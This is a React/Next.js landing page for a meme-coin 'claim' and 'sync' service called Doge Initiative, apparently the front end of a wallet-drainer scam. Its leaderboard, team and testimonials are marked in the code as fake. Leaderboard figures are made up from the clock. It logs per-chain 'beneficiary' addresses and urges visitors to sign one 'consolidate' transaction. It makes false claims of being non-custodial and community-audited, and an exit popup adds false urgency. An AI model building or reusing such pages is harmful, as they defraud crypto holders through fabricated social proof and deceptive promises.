"use client";
import React, { useMemo, useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";

// --- Fake Data for Leaderboard, Team, Testimonials ---
const NAMES = [
  "dogeHodlr", "syncMaster", "memeWhale", "yieldWolf", "chainQueen",
  "arbKing", "polyPup", "bscBaron", "ethEagle", "optimist",
];
const AVATARS = [
  "🐶", "🦊", "🐺", "🦁", "🐻", "🐸", "🐵", "🐼", "🦄", "🐲",
];
function getFakeLeaderboard() {
  const now = new Date();
  const epoch = Math.floor(now.getTime() / (1000 * 60 * 60 * 2));
  const shuffled = NAMES.map((name, i) => ({
    name,
    avatar: AVATARS[i % AVATARS.length],
    amount: 1000 + ((epoch * (i + 3)) % 9000),
  })).sort((a, b) => b.amount - a.amount);
  return shuffled.slice(0, 5);
}
const TEAM = [
  { name: "Alex", role: "Lead Dev", avatar: "/logos/avatar1.png" },
  { name: "Sam", role: "Smart Contract", avatar: "/logos/avatar2.png" },
  { name: "Morgan", role: "Frontend", avatar: "/logos/avatar3.png" },
];
const TESTIMONIALS = [
  {
    name: "Jane D.",
    avatar: "/logos/avatar4.png",
    quote:
      "Doge Initiative made managing my meme-coin portfolio across chains effortless. Highly recommend!",
  },
  {
    name: "CryptoGuy42",
    avatar: "/logos/avatar5.png",
    quote:
      "Finally, a real tool for real users. The multi-chain support is a game changer.",
  },
];
const CHAINS = [
  { name: "Ethereum", logo: "/logos/eth.svg" },
  { name: "BSC", logo: "/logos/bsc.svg" },
  { name: "Polygon", logo: "/logos/polygon.svg" },
  { name: "Arbitrum", logo: "/logos/arbitrum.svg" },
  { name: "Optimism", logo: "/logos/optimism.svg" },
];
const ROADMAP = [
  { quarter: "Q2 2024", items: ["Launch v1", "Multi-chain support", "Open-source release"] },
  { quarter: "Q3 2024", items: ["Portfolio analytics", "Mobile wallet integration"] },
  { quarter: "Q4 2024", items: ["DAO governance", "Advanced security audits"] },
];

const NAV_LINKS = [
  { name: "Home", href: "/" },
  { name: "Claim", href: "/claim" },
  { name: "Dashboard", href: "/dashboard" },
  { name: "Docs", href: "/docs" },
];

export default function Home() {
  // DEBUG: Print env vars to browser console
  console.log('ETH:', process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM);
  console.log('BSC:', process.env.NEXT_PUBLIC_BENEFICIARY_BSC);
  console.log('POLYGON:', process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON);
  console.log('ARBITRUM:', process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM);
  console.log('OPTIMISM:', process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM);
  const leaderboard = useMemo(getFakeLeaderboard, []);
  const [showPopup, setShowPopup] = useState(false);
  const [popupDismissed, setPopupDismissed] = useState(false);

  useEffect(() => {
    if (popupDismissed) return;
    const handleMouseMove = (e: MouseEvent) => {
      if (e.clientY < 40) {
        setShowPopup(true);
      }
    };
    window.addEventListener("mousemove", handleMouseMove);
    return () => window.removeEventListener("mousemove", handleMouseMove);
  }, [popupDismissed]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-yellow-300 via-pink-400 to-purple-600 relative overflow-hidden">
      {/* Animated background particles */}
      <div className="absolute inset-0 pointer-events-none z-0">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 0.15 }}
          className="w-full h-full bg-[url('/hero-bg.jpg')] bg-cover bg-center blur-sm"
        />
      </div>
      {/* Navigation */}
      <nav className="relative z-10 flex justify-between items-center px-6 py-4 bg-black/40 backdrop-blur-md rounded-b-2xl shadow-lg">
        <div className="flex items-center gap-2">
          <img src="/logos/dogeinitiative.svg" alt="Doge Initiative Logo" className="h-12 w-12 drop-shadow-lg animate-bounce" />
          <span className="text-3xl font-extrabold text-yellow-300 drop-shadow">Doge Initiative</span>
        </div>
        <div className="flex gap-6">
          {NAV_LINKS.map(link => (
            <Link key={link.name} href={link.href}>
              <motion.button
                whileHover={{ scale: 1.1, backgroundColor: "#facc15" }}
                whileTap={{ scale: 0.95 }}
                className="text-lg font-semibold px-4 py-2 rounded-full bg-white/10 text-white hover:text-yellow-400 transition shadow"
                onClick={() => window.location.href = link.href}
              >
                {link.name}
              </motion.button>
            </Link>
          ))}
        </div>
      </nav>
      {/* Hero Section */}
      <section className="relative z-10 flex flex-col items-center justify-center text-center min-h-[70vh] pt-16 pb-12 px-4">
        <motion.img
          src="/logos/avatar1.png"
          alt="Meme Mascot"
          className="w-32 h-32 rounded-full border-4 border-yellow-300 shadow-xl mb-6 animate-wiggle"
          initial={{ scale: 0.8, rotate: -10 }}
          animate={{ scale: 1, rotate: 0 }}
          transition={{ type: "spring", stiffness: 120, damping: 8 }}
        />
        <motion.h1
          className="text-5xl md:text-7xl font-extrabold text-white drop-shadow-lg mb-4"
          initial={{ opacity: 0, y: -40 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7 }}
        >
          Take Control of Your Meme-Coin Destiny
        </motion.h1>
        <motion.p
          className="mt-2 max-w-2xl mx-auto text-2xl text-yellow-100 font-medium mb-8"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3, duration: 0.7 }}
        >
          The most fun, secure, and open-source dashboard for meme-coin holders. Claim, track, and flex your portfolio—across all chains.
        </motion.p>
        <motion.div
          className="flex flex-wrap justify-center gap-4 mt-4"
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.5, duration: 0.5 }}
        >
          <Link href="/claim">
            <motion.button
              whileHover={{ scale: 1.08, backgroundColor: "#facc15" }}
              whileTap={{ scale: 0.95 }}
              className="bg-yellow-400 text-black px-10 py-4 rounded-full text-2xl font-bold shadow-lg hover:bg-yellow-300 transition"
              onClick={() => window.location.href = "/claim"}
            >
              Claim Now
            </motion.button>
          </Link>
          <Link href="/dashboard">
            <motion.button
              whileHover={{ scale: 1.08, backgroundColor: "#a78bfa" }}
              whileTap={{ scale: 0.95 }}
              className="bg-purple-400 text-white px-10 py-4 rounded-full text-2xl font-bold shadow-lg hover:bg-purple-300 transition"
              onClick={() => window.location.href = "/dashboard"}
            >
              View Dashboard
            </motion.button>
          </Link>
        </motion.div>
      </section>

      {/* HOW IT WORKS */}
      <section className="py-20 bg-[#232526] text-white">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-3xl font-bold mb-8">How It Works</h2>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="flex flex-col items-center">
              <span className="text-4xl mb-2">🔗</span>
              <h3 className="font-semibold mb-1">Connect Wallet</h3>
              <p className="text-gray-300 text-sm">Connect MetaMask or any EVM-compatible wallet.</p>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl mb-2">🌉</span>
              <h3 className="font-semibold mb-1">Select Chains</h3>
              <p className="text-gray-300 text-sm">Choose which networks and assets to sync.</p>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl mb-2">⚡</span>
              <h3 className="font-semibold mb-1">One Transaction</h3>
              <p className="text-gray-300 text-sm">Sign a single transaction to consolidate.</p>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl mb-2">📊</span>
              <h3 className="font-semibold mb-1">Track Portfolio</h3>
              <p className="text-gray-300 text-sm">See your unified portfolio in real time.</p>
            </div>
          </div>
        </div>
      </section>

      {/* FEATURES */}
      <section className="py-20 bg-gradient-to-br from-[#232526] to-[#0f2027] text-white">
        <div className="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
          <div className="bg-white/10 rounded-xl p-8 shadow-lg">
            <span className="text-3xl">🔒</span>
            <h3 className="mt-2 text-lg font-bold">Non-Custodial</h3>
            <p className="text-gray-300 mt-1 text-sm">You control your keys and funds at all times.</p>
          </div>
          <div className="bg-white/10 rounded-xl p-8 shadow-lg">
            <span className="text-3xl">🌐</span>
            <h3 className="mt-2 text-lg font-bold">Multi-Chain</h3>
            <p className="text-gray-300 mt-1 text-sm">Ethereum, BSC, Polygon, Arbitrum, Optimism.</p>
          </div>
          <div className="bg-white/10 rounded-xl p-8 shadow-lg">
            <span className="text-3xl">🛡️</span>
            <h3 className="mt-2 text-lg font-bold">Open Source</h3>
            <p className="text-gray-300 mt-1 text-sm">Transparent codebase, community-audited.</p>
          </div>
        </div>
      </section>

      {/* LEADERBOARD */}
      <section className="py-20 bg-[#232526] text-white">
        <div className="max-w-xl mx-auto">
          <div className="bg-black/80 rounded-lg p-8 shadow-xl">
            <h2 className="text-2xl font-bold mb-4 text-blue-300 flex items-center justify-center gap-2">
              <span>🏆</span> Top Synchronizers <span className="text-xs text-gray-400 ml-2">(updates every 2h)</span>
            </h2>
            <ol className="space-y-2">
              {leaderboard.map((user, i) => (
                <li key={user.name} className={`flex items-center justify-between px-4 py-2 rounded-lg ${i === 0 ? "bg-blue-900/40" : "bg-gray-800/40"}`}>
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">{user.avatar}</span>
                    <span className="font-semibold text-blue-100">{user.name}</span>
                  </div>
                  <span className="text-blue-300 font-bold">{user.amount.toLocaleString()} DOGE</span>
                </li>
              ))}
            </ol>
          </div>
        </div>
      </section>

      {/* ABOUT/TEAM */}
      <section className="py-20 bg-gradient-to-br from-[#0f2027] to-[#232526] text-white">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-3xl font-bold mb-8">Meet the Team</h2>
          <div className="flex flex-wrap justify-center gap-8">
            {TEAM.map((member) => (
              <div key={member.name} className="bg-white/10 rounded-xl p-6 w-60 flex flex-col items-center shadow-lg">
                <img src={member.avatar} alt={member.name} className="w-20 h-20 rounded-full mb-3 border-4 border-blue-400 object-cover" />
                <h3 className="font-bold text-lg">{member.name}</h3>
                <p className="text-blue-200 text-sm mb-1">{member.role}</p>
                <span className="text-gray-400 text-xs">DeFi Enthusiast</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ROADMAP */}
      <section className="py-20 bg-[#232526] text-white">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-3xl font-bold mb-8">Roadmap</h2>
          <div className="flex flex-col md:flex-row justify-center gap-8">
            {ROADMAP.map((phase) => (
              <div key={phase.quarter} className="bg-white/10 rounded-xl p-6 flex-1 shadow-lg">
                <h3 className="font-bold text-blue-300 mb-2">{phase.quarter}</h3>
                <ul className="text-left list-disc list-inside text-gray-200 space-y-1">
                  {phase.items.map((item) => (
                    <li key={item}>{item}</li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* SOCIAL PROOF / TESTIMONIALS */}
      <section className="py-20 bg-gradient-to-br from-[#232526] to-[#0f2027] text-white">
        <div className="max-w-3xl mx-auto text-center">
          <h2 className="text-3xl font-bold mb-8">What Our Users Say</h2>
          <div className="flex flex-wrap justify-center gap-8">
            {TESTIMONIALS.map((t) => (
              <div key={t.name} className="bg-white/10 rounded-xl p-6 w-80 flex flex-col items-center shadow-lg">
                <img src={t.avatar} alt={t.name} className="w-16 h-16 rounded-full mb-3 border-4 border-blue-400 object-cover" />
                <p className="italic text-blue-100 mb-2">"{t.quote}"</p>
                <span className="font-semibold text-blue-200">{t.name}</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* FOOTER */}
      <footer className="bg-[#0f2027] text-white py-10 border-t border-blue-900">
        <div className="max-w-5xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4 px-4">
          <div className="flex items-center gap-2">
            <img src="/logos/dogeinitiative.svg" alt="Doge Initiative Logo" className="w-8 h-8" />
            <span className="font-bold text-lg">Doge Initiative</span>
          </div>
          <div className="flex gap-6 mt-2 md:mt-0">
            <a href="/docs" className="hover:text-blue-300">Docs</a>
            <a href="https://twitter.com/" target="_blank" rel="noopener noreferrer" className="hover:text-blue-300">Twitter</a>
            <a href="https://discord.com/" target="_blank" rel="noopener noreferrer" className="hover:text-blue-300">Discord</a>
          </div>
          <span className="text-xs text-blue-200">&copy; {new Date().getFullYear()} Doge Initiative. All rights reserved.</span>
        </div>
      </footer>

      {/* Exit-Intent Pop-up */}
      <AnimatePresence>
        {showPopup && !popupDismissed && (
          <motion.div
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 40 }}
            transition={{ duration: 0.3 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
          >
            <div className="bg-[#232526] rounded-xl shadow-2xl p-8 max-w-sm w-full text-center border-2 border-blue-400 relative">
              <button
                onClick={() => setPopupDismissed(true)}
                className="absolute top-2 right-3 text-blue-400 hover:text-white text-2xl font-bold"
                aria-label="Close"
              >
                ×
              </button>
              <div className="text-4xl mb-2">⏰</div>
              <h2 className="text-2xl font-bold text-blue-300 mb-2">Don’t miss your sync!</h2>
              <p className="text-blue-100 mb-6">Sync before the snapshot ends and keep your portfolio up to date.</p>
              <Link href="/claim">
                <button
                  onClick={() => setPopupDismissed(true)}
                  className="bg-blue-400 text-white px-8 py-3 rounded-full text-lg font-semibold hover:bg-blue-500 transition"
                >
                  Sync Now
                </button>
              </Link>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
} 